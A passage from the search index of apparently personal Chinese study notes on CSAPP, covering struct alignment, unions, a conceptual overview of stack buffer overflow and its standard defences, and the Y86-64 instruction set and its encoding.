<p>\u65e0\u8bba\u662f\u5355\u4e2a\u53d8\u91cf\u8fd8\u662f\u6570\u7ec4\u5143\u7d20\uff0c\u90fd\u662f\u901a\u8fc7\u8d77\u59cb\u5730\u5740\u52a0\u504f\u79fb\u91cf\u7684\u8bbf\u95ee\u65b9\u5f0f\u6765\u8bbf\u95ee</p> <p></p> <ul> <li>\u5bf9\u4e8e\u56fe\u4e2d\u7684\u7ed3\u6784\u4f53\uff0c\u5b83\u5305\u542b\u4e24\u4e2a<code>int</code>\u7c7b\u578b\u7684\u53d8\u91cf\u4ee5\u53ca\u4e00\u4e2a<code>char</code>\u7c7b\u578b\u7684\u53d8\u91cf\uff0c\u6211\u4eec\u6709\u53ef\u80fd\u4e0b\u610f\u8bc6\u79fb\u4f4d\u5b83\u5360\u4e5d\u4e2a\u5b57\u8282\u7684\u5b58\u50a8\u7a7a\u95f4</li> <li>\u5b9e\u9645\u4e0a\uff0c\u4f7f\u7528<code>sizeof()</code>\u51fd\u6570\u5bf9\u5176\u5927\u5c0f\u6c42\u503c\uff0c\u53ef\u4ee5\u5f97\u5230\u5b83\u7684\u5b9e\u9645\u5b58\u50a8\u7a7a\u95f4\u4e3a12\u5b57\u8282</li> <li>\u539f\u56e0\u662f\u4e3a\u4e86\u63d0\u9ad8\u5185\u5b58\u7cfb\u7edf\u7684\u6027\u80fd\uff0c\u7cfb\u7edf\u5bf9\u4e8e\u6570\u636e\u5b58\u50a8\u7684\u5408\u6cd5\u5730\u5740\u505a\u51fa\u4e86\u4e00\u4e9b\u9650\u5236<ul> <li>\u5bf9\u4e8e\u4e0d\u540c\u7684\u6570\u636e\u7c7b\u578b\uff0c\u5730\u5740\u5bf9\u9f50\u7684\u539f\u5219\u662f\u4efb\u4f55K\u5b57\u8282\u7684\u57fa\u672c\u5bf9\u8c61\u7684\u5730\u5740\u5fc5\u987b\u662fK\u7684\u500d\u6570</li> <li>\u4f8b\u5982\u53d8\u91cf<code>j</code>\u662f<code>int</code>\u7c7b\u578b\uff0c\u5360\u56db\u4e2a\u5b57\u8282\uff0c\u90a3\u4e48\u5b83\u7684\u8d77\u59cb\u5730\u5740\u5fc5\u987b\u662f\u56db\u7684\u500d\u6570\uff0c\u56e0\u6b64\u7f16\u8bd1\u5668\u4f1a\u5728\u53d8\u91cf<code>c</code>\u548c<code>j</code>\u4e4b\u95f4\u63d2\u4e00\u4e2a\u4e09\u5b57\u8282\u7684\u95f4\u9699</li> <li>\u9664\u6b64\u4e4b\u5916\uff0c\u7ed3\u6784\u4f53\u7684\u672b\u5c3e\u8fd8\u53ef\u80fd\u9700\u8981\u586b\u5145\u95f4\u9699 (\u5bf9\u4e8e\u7ed3\u6784\u4f53\u6570\u7ec4\u800c\u8a00)</li> </ul> </li> </ul> <p>More Example!</p> <p></p> <p>C\u8bed\u8a00\u4e2d\u8fd8\u6709\u4e00\u79cd\u6570\u636e\u7c7b\u578b\u2014\u2014 \u8054\u5408\u4f53</p> <p></p> <p>\u4e0e\u7ed3\u6784\u4f53\u4e0d\u540c\uff0c\u8054\u5408\u4f53\u6240\u6709\u53d8\u91cf\u5171\u7528\u540c\u4e00\u4e2a\u5185\u5b58\u533a\u57df\uff0c\u56e0\u6b64\u8054\u5408\u4f53\u7684\u5927\u5c0f\u53d6\u51b3\u4e8e\u5b83\u6700\u5927\u5b57\u6bb5\u7684\u5927\u5c0f</p> <p>\u5982\u4e0a\u56fe\u8054\u5408\u4f53\uff0c\u53d8\u91cf<code>v</code>\u548c\u6570\u7ec4<code>i[2]</code>\u7684\u5927\u5c0f\u90fd\u662f\u516b\u4e2a\u5b57\u8282\uff0c\u56e0\u6b64\uff0c\u8fd9\u4e2a\u8054\u5408\u4f53\u5360\u75288\u4e2a\u5b57\u8282\u7684\u5b58\u50a8\u7a7a\u95f4</p> <p>\u8054\u5408\u4f53\u7684\u4e00\u79cd\u5e94\u7528\u60c5\u51b5\u662f\uff0c\u6211\u4eec\u4e8b\u5148\u77e5\u9053\u4e24\u4e2a\u4e0d\u540c\u5b57\u6bb5\u7684\u4f7f\u7528\u662f\u4e92\u65a5\u7684\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5c06\u8fd9\u4e24\u4e2a\u5b57\u6bb5\u58f0\u660e\u4e3a\u4e00\u4e2a\u8054\u5408\u4f53</p> <p>\u4f8b\u5982\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u4e8c\u53c9\u6811\uff0c\u5176\u4e2d\u53ea\u6709\u53f6\u8282\u70b9\u542b\u6709\u4e24\u4e2a<code>double</code>\u7c7b\u578b\u7684\u6570\u636e\uff0c\u90a3\u4e48\u4f7f\u7528<code>struct</code>\u5b9a\u4e49\u5176\u8282\u70b9\u9700\u898132\u4e2a\u5b57\u8282(\u4e0a)</p> <p></p> <p>\u7531\u4e8e\u5176\u7279\u6b8a\u6027\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8054\u5408\u4f53<code>union</code>\u6765\u5b9a\u4e49\u5176\u8282\u70b9(\u4e0b)\uff0c\u662f\u7684\u6bcf\u4e2a\u8282\u70b9\u53ea\u9700\u898116\u4e2a\u5b57\u8282\u7684\u5b58\u50a8\u7a7a\u95f4\uff0c\u76f8\u5bf9\u4e8e\u7ed3\u6784\u4f53\u7684\u5b9a\u4e49\u65b9\u5f0f\uff0c\u53ef\u4ee5\u8282\u7701\u4e00\u534a\u7a7a\u95f4</p> <p>\u8fd9\u79cd\u7f16\u7801\u65b9\u5f0f\uff0c\u6ca1\u6709\u529e\u6cd5\u786e\u5b9a\u4e00\u4e2a\u8282\u70b9\u5230\u5e95\u662f\u53f6\u8282\u70b9\u8fd8\u662f\u5185\u90e8\u8282\u70b9</p> <p>\u901a\u5e38\u7684\u89e3\u51b3\u65b9\u6cd5\u662f\u5f15\u5165\u4e00\u4e2a\u679a\u4e3e\u7c7b\u578b\uff0c\u7136\u540e\u521b\u5efa\u4e00\u4e2a\u7ed3\u6784\u4f53\uff0c\u5b83\u5305\u542b\u4e00\u4e2a\u6807\u7b7e\u548c\u4e00\u4e2a\u8054\u5408\u4f53 </p><pre><code>typedef enum {N_LEAF,N_INTERNAL} nodetype_t;\n\nstruct node_t{\n    nodetype_t type;\n    union {\n        struct {\n            struct node_t *left;\n            struct node_t *right;\n        } internal;\n        double data[2];\n    } info;\n};\n</code></pre> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u8054\u5408\u4f53\u8fd8\u53ef\u4ee5\u7528\u6765\u8bbf\u95ee\u4e0d\u540c\u6570\u636e\u7c7b\u578b\u7684\u4f4d\u6a21\u5f0f\uff0c\u5f53\u6211\u4eec\u4f7f\u7528\u7b80\u5355\u7684\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\uff0c\u5c06<code>double</code>\u7c7b\u578b\u8f6c\u6362\u6210<code>unsigned long</code>\u7c7b\u578b\u7684\u65f6\u5019 (<code>unsigned long u = (unsigned long) d</code>)\uff0c\u7531\u4e8e\u4e8c\u8005\u7684\u4e8c\u8fdb\u5236\u4f4d\u5dee\u522b\u5f88\u5927\uff0c\u8fd9\u65f6\u6211\u4eec\u53ef\u4ee5\u5c06\u8fd9\u4e24\u8005\u7c7b\u578b\u7684\u53d8\u91cf\u58f0\u660e\u4e3a\u4e00\u4e2a\u8054\u5408\u4f53\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4ee5\u4e00\u79cd\u7c7b\u578b\u6765\u5b58\u50a8\uff0c\u4ee5\u53e6\u5916\u4e00\u79cd\u7c7b\u578b\u6765\u8bbf\u95ee\uff0c\u53d8\u91cf<code>u</code>\u548c<code>d</code>\u5c31\u5177\u6709\u76f8\u540c\u7684\u4f4d\u8868\u793a\uff1a</p> <pre><code>unsigned long double2bits (double d) {\n    union {\n        double d;\n        unsigned long u;\n    } temp;\n    temp.d = d;\n    return temp.u;\n};\n</code></pre>"},{"location":"Accumulation/CSAPP/Chapter3/#_12","title":"\u7f13\u51b2\u533a\u6ea2\u51fa","text":"<p>\u6808\u5e27\u4e2d\u4fdd\u5b58\u7740\u7a0b\u5e8f\u6267\u884c\u6240\u9700\u8981\u7684\u91cd\u8981\u4fe1\u606f\uff0c\u5982\u8fd4\u56de\u5730\u5740\u3001\u5bc4\u5b58\u5668\u7684\u503c\u7b49\u3002\u4f46\u662f\u5728C\u8bed\u8a00\u4e2d\uff0c\u5bf9\u6570\u7ec4\u7684\u5f15\u7528\u4e0d\u4f1a\u8fdb\u884c\u4efb\u4f55\u7684\u8fb9\u754c\u68c0\u67e5\uff0c\u90a3\u4e48\u5bf9\u8d8a\u754c\u7684\u6570\u7ec4\u8fdb\u884c\u5199\u64cd\u4f5c\uff0c\u5c31\u4f1a\u7834\u574f\u5b58\u50a8\u5728\u6808\u4e2d\u7684\u72b6\u6001\u4fe1\u606f</p> <p>\u5927\u540d\u9f0e\u9f0e\u7684 Stack Overflow</p> <p>\u6808\u6ea2\u51fa\u6307\u7684\u662f\u7a0b\u5e8f\u5411\u6808\u4e2d\u67d0\u4e2a\u53d8\u91cf\u4e2d\u5199\u5165\u7684\u5b57\u8282\u6570\u8d85\u8fc7\u4e86\u8fd9\u4e2a\u53d8\u91cf\u672c\u8eab\u6240\u7533\u8bf7\u7684\u5b57\u8282\u6570\uff0c\u56e0\u800c\u5bfc\u81f4\u4e0e\u5176\u76f8\u90bb\u7684\u6808\u4e2d\u7684\u53d8\u91cf\u7684\u503c\u88ab\u6539\u53d8\u3002\u8fd9\u79cd\u95ee\u9898\u662f\u4e00\u79cd\u7279\u5b9a\u7684\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u7c7b\u4f3c\u7684\u8fd8\u6709\u5806\u6ea2\u51fa\uff0cbss \u6bb5\u6ea2\u51fa\u7b49\u6ea2\u51fa\u65b9\u5f0f\u3002\u6808\u6ea2\u51fa\u6f0f\u6d1e\u8f7b\u5219\u53ef\u4ee5\u4f7f\u7a0b\u5e8f\u5d29\u6e83\uff0c\u91cd\u5219\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u3002\u6b64\u5916\uff0c\u6211\u4eec\u4e5f\u4e0d\u96be\u53d1\u73b0\uff0c\u53d1\u751f\u6808\u6ea2\u51fa\u7684\u57fa\u672c\u524d\u63d0\u662f\uff1a</p> <ul> <li>\u7a0b\u5e8f\u5fc5\u987b\u5411\u6808\u4e0a\u5199\u5165\u6570\u636e\u3002</li> <li>\u5199\u5165\u7684\u6570\u636e\u5927\u5c0f\u6ca1\u6709\u88ab\u826f\u597d\u5730\u63a7\u5236\u3002</li> </ul> <p>\u8be6\u60c5\u53ef\u81ea\u884c\u4e86\u89e3 CTF \u6bd4\u8d5b\u4e2d\u7684 pwn \u9898\u76ee</p> <p>\u7f16\u8bd1\u5668\u548c\u64cd\u4f5c\u7cfb\u7edf\u4e3a\u4e86\u5bf9\u6297\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb\uff0c\u4f7f\u7528\u4e86\uff1a</p> <ul> <li>Stack Randomization (\u6808\u968f\u673a\u5316)<ul> <li>\u6808\u7684\u4f4d\u7f6e\u5728\u6bcf\u6b21\u8fd0\u884c\u65f6\u90fd\u6709\u53d8\u5316</li> <li>\u5728 Linux \u7cfb\u7edf\u4e2d\uff0c\u6808\u968f\u673a\u5316\u5df2\u7ecf\u6210\u4e3a\u4e86\u6807\u51c6\u884c\u4e3a\uff0c\u5b83\u5c5e\u4e8e\u5730\u5740\u7a7a\u95f4\u5e03\u5c40\u968f\u673a\u5316\u7684\u4e00\u79cd\uff0c\u7b80\u79f0 ASLR</li> </ul> </li> <li>Stack Corruption Detection (\u6808\u7834\u574f\u68c0\u6d4b)<ul> <li>\u7f16\u8bd1\u5668\u5728\u4ea7\u751f\u7684\u6c47\u7f16\u4ee3\u7801\u4e2d\u52a0\u5165\u4e00\u79cd\u6808\u4fdd\u62a4\u673a\u5236\u6765\u68c0\u6d4b\u7f13\u51b2\u533a\u8d8a\u754c\uff0c\u5373\u5728\u7f13\u51b2\u533a\u4e0e\u6808\u4fdd\u5b58\u7684\u72b6\u6001\u503c\u4e2d\u5b58\u50a8\u4e00\u4e2a\u7279\u6b8a\u503c\uff0c\u91d1\u4e1d\u96c0\u503c (canary) </li> <li>canary \u662f\u6bcf\u6b21\u7a0b\u5e8f\u8fd0\u884c\u65f6\u968f\u673a\u4ea7\u751f\u7684\uff0c\u5728\u51fd\u6570\u8fd4\u56de\u4e4b\u524d\uff0c\u4f1a\u68c0\u6d4b\u91d1\u4e1d\u96c0\u503c\u662f\u5426\u88ab\u4fee\u6539\u6765\u5224\u65ad\u662f\u5426\u906d\u53d7\u653b\u51fb</li> </ul> </li> <li>Limiting Executable Code Regions (\u9650\u5236\u53ef\u6267\u884c\u4ee3\u7801\u533a\u57df)<ul> <li>\u6d88\u9664\u653b\u51fb\u8005\u5411\u7cfb\u7edf\u4e2d\u63d2\u5165\u53ef\u6267\u884c\u4ee3\u7801\u7684\u80fd\u529b</li> <li>\u5176\u4e2d\u4e00\u79cd\u65b9\u6cd5\u662f\u9650\u5236\u54ea\u4e9b\u5185\u5b58\u533a\u57df\u80fd\u591f\u5b58\u653e\u53ef\u6267\u884c\u4ee3\u7801 (CTF\u9898\u76ee\u4e00\u822c\u4f1a\u7ed9\u51fa\u53ef\u8bfb\u53ef\u5199\u53ef\u6267\u884c\u5730\u5740)</li> </ul> </li> </ul>"},{"location":"Accumulation/CSAPP/Chapter4/","title":"CH 4. \u5904\u7406\u5668\u4f53\u7cfb\u7ed3\u6784","text":""},{"location":"Accumulation/CSAPP/Chapter4/#chapter-4-processor-architecture","title":"Chapter 4. Processor Architecture","text":"<p> \u7ea6 3684 \u4e2a\u5b57  31 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 19 \u5206\u949f</p> <p>Quote</p> <p>\u6307\u4ee4\u7cfb\u7edf\u662f\u8ba1\u7b97\u673a\u8f6f\u4ef6\u548c\u786c\u4ef6\u7684\u4ea4\u4e92\u63a5\u53e3\uff0c\u7a0b\u5e8f\u5458\u6839\u636e\u6307\u4ee4\u7cfb\u7edf\u8bbe\u8ba1\u8f6f\u4ef6\uff0c\u5904\u7406\u5668\u8bbe\u8ba1\u4eba\u5458\u6839\u636e\u6307\u4ee4\u7cfb\u7edf\u6765\u5b9e\u73b0\u786c\u4ef6\u3002</p>"},{"location":"Accumulation/CSAPP/Chapter4/#y86-64","title":"\u4eceY86-64\u8bb2\u8d77","text":"<p>\u7531\u4e8e<code>x86-64</code>\u6307\u4ee4\u7cfb\u7edf\u8f83\u4e3a\u590d\u6742\uff0c\u4e3a\u65b9\u4fbf\u5b66\u4e60\u548c\u7406\u89e3\uff0cCSAPP\u539f\u4e66\u4e2d\u53c2\u7167<code>x86-64</code>\u7684\u6307\u4ee4\u7cfb\u7edf\uff0c\u81ea\u5b9a\u4e49\u4e86\u4e00\u4e2a\u76f8\u5bf9\u7b80\u5355\u7684\u6307\u4ee4\u7cfb\u7edf\u2014\u2014<code>Y86-64</code>\uff0c\u8be5\u6307\u4ee4\u7cfb\u7edf\u5b9a\u4e49\u5305\u62ec\uff1a</p> <ul> <li>Programmer-Visible State \u7a0b\u5e8f\u5458\u53ef\u89c1\u72b6\u6001</li> <li>Y86-64 Instructions \u6307\u4ee4\u96c6</li> <li>Instruction Encoding \u6307\u4ee4\u96c6\u7684\u7f16\u7801</li> <li>Y86-64 Exceptions \u7f16\u7a0b\u89c4\u8303\u4ee5\u53ca\u5f02\u5e38\u4e8b\u4ef6\u5904\u7406</li> </ul>"},{"location":"Accumulation/CSAPP/Chapter4/#programmmer-visible-state","title":"Programmmer-Visible State","text":"<p>\u7a0b\u5e8f\u5458\u53ef\u89c1\uff0c\u8fd9\u91cc\u7684 Programmer \u65e2\u53ef\u4ee5\u662f\u7528\u6c47\u7f16\u4ee3\u7801\u5199\u7a0b\u5e8f\u7684\u4eba\uff0c\u4e5f\u53ef\u4ee5\u662f\u4ea7\u751f\u673a\u5668\u7ea7\u4ee3\u7801\u7684\u7f16\u8bd1\u5668\uff1b\u53ef\u89c1\u72b6\u6001\u662f\u6307\u6bcf\u6761\u6307\u4ee4\u90fd\u4f1a\u53bb\u8bfb\u53d6\u6216\u8005\u4fee\u6539\u5904\u7406\u5668\u7684\u67d0\u4e9b\u90e8\u5206\uff0c\u4f8b\u5982\u5185\u5b58\u3001\u5bc4\u5b58\u5668\u3001\u6761\u4ef6\u7801\u3001\u7a0b\u5e8f\u8ba1\u6570\u5668\u4ee5\u53ca\u7a0b\u5e8f\u72b6\u6001\u7b49</p> <p>\u5728<code>Y86-64</code>\u6307\u4ee4\u7cfb\u7edf\u4e2d\uff0c\u5b9a\u4e49\u4e8615\u4e2a64\u4f4d\u7684\u7a0b\u5e8f\u5bc4\u5b58\u5668\uff0c\u76f8\u5bf9\u4e8e<code>x86-64</code>\u5c11\u4e86\u4e00\u4e2a\u5bc4\u5b58\u5668<code>%r15</code>\uff0c\u4e3b\u8981\u662f\u4e3a\u4e86\u964d\u4f4e\u6307\u4ee4\u7f16\u7801\u7684\u590d\u6742\u5ea6</p> <p>\u9664\u6b64\u4e4b\u5916\uff0c<code>Y86-64</code>\u7684\u6307\u4ee4\u7cfb\u7edf\u8fd8\u7b80\u5316\u4e86\u6761\u4ef6\u7801\u5bc4\u5b58\u5668\uff0c\u4ec5\u4fdd\u7559\u4e86\u96f6\u6807\u5fd7(ZF)\u3001\u7b26\u53f7\u6807\u5fd7(SF)\u548c\u6ea2\u51fa\u6807\u5fd7(OF)</p> <p>\u590d\u4e60\u4e00\u4e0b\uff1a\u7a0b\u5e8f\u8ba1\u6570\u5668<code>PC</code>\u7528\u6765\u5b58\u653e\u5f53\u524d\u6b63\u5728\u6267\u884c\u6307\u4ee4\u7684\u5730\u5740</p>"},{"location":"Accumulation/CSAPP/Chapter4/#y86-64-instructions","title":"Y86-64 Instructions","text":"<p>\u7c7b\u6bd4<code>x86</code>\uff0c<code>Y86</code>\u5bf9\u5176\u6307\u4ee4\u96c6\u505a\u4e86\u4e00\u5b9a\u7a0b\u5ea6\u7684\u7b80\u5316\uff0c\u4f8b\u5982\u5c06<code>movq</code>\u6307\u4ee4\u6309\u7167\u6e90\u64cd\u4f5c\u6570\u548c\u76ee\u7684\u64cd\u4f5c\u6570\u7684\u7c7b\u578b\u5206\u4e3a\u4e86\u56db\u7c7b\uff1a</p> Source Destinination rrmovq Register Register Irmovq Immediate Register rmmovq Register Memory mrmovq Memory Register <p>\u8fd9\u6837\u8bbe\u8ba1\u7684\u76ee\u7684\u4e3b\u8981\u662f\u4e3a\u4e86\u964d\u4f4e\u5904\u7406\u5668\u5b9e\u73b0\u7684\u590d\u6742\u5ea6</p>"},{"location":"Accumulation/CSAPP/Chapter4/#instruction-encoding","title":"Instruction Encoding","text":"<p>\u63a5\u4e0b\u6765\u6211\u4eec\u5bf9\u4e0a\u8ff0\u6570\u636e\u4f20\u9001\u6307\u4ee4\u8fdb\u884c\u7f16\u7801\uff0c\u6bcf\u6761\u6307\u4ee4\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u8868\u793a\u6307\u4ee4\u7684\u7c7b\u578b\u3002\u8fd9\u4e2a\u5b57\u8282\u5206\u4e3a\u4e24\u90e8\u5206\uff0c\u6bcf\u4e00\u90e8\u5206\u5360\u56db\u4e2a\u6bd4\u7279\u4f4d\uff1a\u9ad8\u56db\u4f4d\u8868\u793a\u6307\u4ee4\u4ee3\u7801\uff0c\u4f4e\u56db\u4f4d\u8868\u793a\u6307\u4ee4\u529f\u80fd</p> <p></p> <p>\u5bf9\u4e8e\u4e0a\u8ff0\u5b9a\u4e49\u7684\u6570\u636e\u4f20\u9001\u6307\u4ee4\uff0c\u4e0d\u540c\u7684\u6307\u4ee4\u4ee3\u7801\u8868\u793a\u4e0d\u540c\u7684\u6307\u4ee4\uff0c\u6307\u4ee4\u7684\u529f\u80fd\u90e8\u5206\u5747\u4e3a 0</p> <p>\u5728 <code>Y86</code> \u7cfb\u7edf\u4e2d\u5b9a\u4e49\u4e8615\u4e2a\u5bc4\u5b58\u5668\uff0c\u867d\u7136\u6bcf\u4e2a\u5bc4\u5b58\u5668\u6709\u7740\u4e0d\u540c\u540d\u5b57\uff0c\u4f46\u662f\u8fd8\u9700\u8981\u4e3a\u6bcf\u4e00\u4e2a\u5bc4\u5b58\u5668\u6307\u5b9a\u4e00\u4e2a\u7f16\u53f7\uff0c\u7528\u5341\u516d\u8fdb\u5236\u6570 <code>0~0xE</code>\u6765\u8868\u793a\u3002\u5982\u679c\u6307\u4ee4\u4e2d\u67d0\u4e2a\u5bc4\u5b58\u5668\u5b57\u6bb5\u7684\u503c\u4e3a<code>0xF</code>\uff0c\u8868\u793a\u6b64\u5904\u6ca1\u6709\u5bc4\u5b58\u5668\u64cd\u4f5c\u6570\u3002</p> <p>\u5bc4\u5b58\u5668\u7f16\u53f7</p> <p></p> <p>\u5728<code>Y86-64</code>\u6307\u4ee4\u7cfb\u7edf\u4e2d\uff0c\u5b9a\u4e49\u4e86\u56db\u6761\u6574\u6570\u64cd\u4f5c\u6307\u4ee4\uff0c\u4e0d\u540c\u4e8e<code>x86</code>\uff0c\u5b83\u4eec\u53ea\u80fd\u5bf9\u5bc4\u5b58\u5668\u6570\u636e\u8fdb\u884c\u64cd\u4f5c\u3002\u7531\u4e8e\u8fd9\u56db\u6761\u6307\u4ee4\u5c5e\u4e8e\u540c\u4e00\u4e2a\u7c7b\u578b\uff0c\u6240\u4ee5\u6307\u4ee4\u4ee3\u7801\u662f\u4e00\u6837\u7684\uff0c\u4e0d\u540c\u7684\u662f\u529f\u80fd\u90e8\u5206\uff1a</p> <p></p> \u8df3\u8f6c\u6307\u4ee4\u6761\u4ef6\u4f20\u9001\u6307\u4ee4Other <p></p> <p>\u6761\u4ef6\u4f20\u9001\u6307\u4ee4\u4e00\u5171\u6709 6 \u6761\uff0c\u5b83\u4e0e\u6570\u636e\u4f20\u9001\u6307\u4ee4<code>rrmovq</code>\u6709\u76f8\u540c\u7684\u6307\u4ee4\u4ee3\u7801</p> <p></p> <p>\u505c\u6b62\u6307\u4ee4 halt \u53ef\u4ee5\u4f7f\u6574\u4e2a\u7cfb\u7edf\u6682\u505c\u8fd0\u884c\uff1b nop \u6307\u4ee4\u8868\u793a\u4e00\u4e2a\u7a7a\u64cd\u4f5c\uff1b call \u6307\u4ee4\u548c ret \u6307\u4ee4\u5206\u522b\u5b9e\u73b0\u51fd\u6570\u8c03\u7528\u4e0e\u8fd4\u56de\uff1b push \u6307\u4ee4\u548c pop \u6307\u4ee4\u5206\u522b\u5b9e\u73b0\u5165\u6808\u548c\u51fa\u6808\u64cd\u4f5c </p> <p></p> <p>\u7efc\u4e0a\u6240\u8ff0\uff0c<code>Y86-64</code>\u7684\u6307\u4ee4\u96c6\u53ca\u5176\u7f16\u7801\u7684\u5b9a\u4e49\u4ecb\u7ecd\u5b8c\u6bd5</p> <p>\u6839\u636e\u4e0a\u8ff0\u7684\u7f16\u7801\u89c4\u5219\uff0c\u53ef\u4ee5\u5c06<code>Y86-64</code>\u7684\u6c47\u7f16\u4ee3\u7801\u7ffb\u8bd1\u6210\u4e8c\u8fdb\u5236\u8868\u793a\uff1a</p> <p>\u4f8b\u5982\uff0c\u5bf9\u4e8e\u6307\u4ee4 <code>rmmovq %rsp, 0x123456789abcd(%rdx)</code> </p> <ul> <li><code>rmmovq</code> \u2192 <code>0x40</code></li> <li><code>%rsp|%rdx</code> \u2192 <code>0x42</code></li> <li><code>0x123456789abcd</code> \u2192 <code>0xcdab896745230100</code><ul> <li>\u901a\u8fc7\u5728\u524d\u9762\u6dfb\u52a0 0 \u6765\u8865\u9f50\u516b\u4e2a\u5b57\u8282</li> <li><code>x86-64</code>\u91c7\u7528\u5c0f\u7aef\u6cd5\u5b58\u50a8\uff0c\u6240\u4ee5\u9700\u8981\u5bf9\u504f\u79fb\u91cf\u8fdb\u884c\u5b57\u8282\u53cd\u5e8f\u64cd\u4f5c</li> </ul> </li> </ul> <p>\u6700\u7ec8\u5f97\u5230\u957f\u5ea6\u4e3a\u5341\u4e2a\u5b57\u8282\u7684\u4e8c\u8fdb\u5236\u6307\u4ee4\uff1a</p> <pre><code>Result:\n+--+--+--+--+--+--+--+--+--+--+\n|40|42|cd|ab|89|67|45|23|01|00|\n+--+--+--+--+--+--+--+--+--+--+\n</code></pre> <p>\u63a5\u4e0b\u6765\u901a\u8fc7\u4e00\u4e2a\u4f8b\u5b50\u770b\u4e00\u4e0bC\u7a0b\u5e8f\u7ffb\u8bd1\u6210<code>Y86-64</code>\u6c47\u7f16\u4ee3\u7801\uff1a</p> <pre><code>long sum(long *start, long count) {\n    long sum = 0;\n    while (count) {\n        sum += *start;\n        start++;\n        count--;\n    }\n    return sum;\n}\n</code></pre> <p>\u90a3\u4e48\u5176\u53ef\u4ee5\u5728<code>Y86-64</code>\u4e0b\u8fd0\u884c\u7684\u6c47\u7f16\u4ee3\u7801\u53ca\u673a\u5668\u7801\u5982\u4e0b\uff1a</p> <p></p>"},{"location":"Accumulation/CSAPP/Chapter4/#y86-64-exceptions","title":"Y86-64 Exceptions","text":"Value Name Meaning Explanation 1 AOK Normal operation \u7a0b\u5e8f\u6b63\u5e38\u6267\u884c 2 HLT halt instruction encountered \u5904\u7406\u5668\u6267\u884c halt \u547d\u4ee4 3 ADR Invalid address encountered \u7a0b\u5e8f\u8bd5\u56fe\u4ece\u975e\u6cd5\u5730\u5740\u8bfb\u53d6\u6570\u636e\u6216\u5411\u975e\u6cd5\u5730\u5740\u5199\u5165\u6570\u636e 4 INS Invalid instruction encountered \u7a0b\u5e8f\u9047\u5230\u975e\u6cd5\u6307\u4ee4"},{"location":"Accumulation/CSAPP/Chapter4/#_1","title":"\u6570\u5b57\u7535\u8def\u4e0e\u5904\u7406\u5668\u8bbe\u8ba1","text":"<p>\u5bf9\u4e8e\u5bc4\u5b58\u5668\u5806 (Register File) \uff0c\u5176\u62bd\u8c61\u5efa\u6a21\u5982\u4e0b\uff1a</p> <p></p> <p>\u4f7f\u7528 Verilog \u5bf9\u8be5\u5bc4\u5b58\u5668\u6587\u4ef6\u8fdb\u884c\u63cf\u8ff0\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>module regfile (\n    output reg[63:0] data_out,\n    input wire[63:0] data_in,\n    input wire[3:0] addr,\n    input wire clock,we_,reset_ //we_: write,enable\n);\n    reg[63:0] regfile[14:0]; //\u5171\u6709\u5341\u4e94\u4e2a\u5bc4\u5b58\u5668\n    assign data_out = regfile[addr];\n    ...\nendmodule\n</code></pre> <p>\u5bc4\u5b58\u5668\u5806\u5177\u4f53\u6784\u9020\u5982\u4e0b\uff0c\u8be6\u60c5\u8bf7\u81ea\u884c\u5b66\u4e60\u6d59\u6c5f\u5927\u5b66\u300a\u6570\u5b57\u903b\u8f91\u8bbe\u8ba1\u300b\uff0c\u8bb2\u7684\u5185\u5bb9\u8fd8\u662f\u76f8\u5f53\u4f18\u8d28\u7684\u3002</p> <p></p> <p>\u8be6\u60c5\u53ef\u4ee5\u4e86\u89e3\u76f8\u5173\u7ae0\u8282\u7b14\u8bb0\uff1a CH 7. Memory Basics - Nimisora's Notes</p>"},{"location":"Accumulation/CSAPP/Chapter4/#y86-64_1","title":"Y86-64 \u7684\u987a\u5e8f\u5b9e\u73b0","text":"<p>\u7b2c\u56db\u7ae0\u7684\u4e3b\u8981\u5185\u5bb9\u662f\u8bbe\u8ba1\u4e00\u4e2a<code>Y86-64</code>\u7684\u5904\u7406\u5668\uff0c\u7528\u5b83\u6765\u6267\u884c\u4e0a\u9762\u751f\u6210\u7684\u4e8c\u8fdb\u5236\u6307\u4ee4</p> <p>\u901a\u5e38\uff0c\u5904\u7406\u5668\u6267\u884c\u4e00\u6761\u6307\u4ee4\u7684\u64cd\u4f5c\u53ef\u4ee5\u88ab\u7ec4\u7ec7\u6210\u516d\u4e2a\u57fa\u672c\u9636\u6bb5\uff1a</p> <ul> <li>\u53d6\u6307\u9636\u6bb5 Fetch<ul> <li>\u6307\u4ee4\u7684\u957f\u5ea6\u5e76\u4e0d\u662f\u56fa\u5b9a\u7684\uff0c\u9700\u8981\u5728\u53d6\u6307\u9636\u6bb5\u8fdb\u884c\u5224\u65ad</li> <li>\u53d6\u6307\u9636\u6bb5\u4f1a\u6839\u636e\u6307\u4ee4\u4ee3\u7801\u5224\u65ad\u6307\u4ee4\u662f\u5426\u542b\u6709\u5bc4\u5b58\u5668\u6307\u793a\u7b26\u4ee5\u53ca\u662f\u5426\u542b\u6709\u5e38\u6570\uff0c\u4ece\u800c\u8ba1\u7b97\u51fa\u5f53\u524d\u6307\u4ee4\u7684\u6307\u4ee4\u957f\u5ea6</li> </ul> </li> <li>\u8bd1\u7801\u9636\u6bb5 Decode<ul> <li>\u8bd1\u7801\u9636\u6bb5\u5373\u4ece\u5bc4\u5b58\u5668\u5806\u4e2d\u8bfb\u53d6\u6570\u636e</li> </ul> </li> <li>\u6267\u884c\u9636\u6bb5 Execute<ul> <li>\u6267\u884c\u7b97\u6570\u903b\u8f91\u8fd0\u7b97</li> <li>\u8ba1\u7b97\u5185\u5b58\u5f15\u7528\u7684\u6709\u6548\u5730\u5740</li> <li><code>push</code> &amp; <code>pop</code></li> </ul> </li> <li>\u8bbf\u5b58\u9636\u6bb5 Memory<ul> 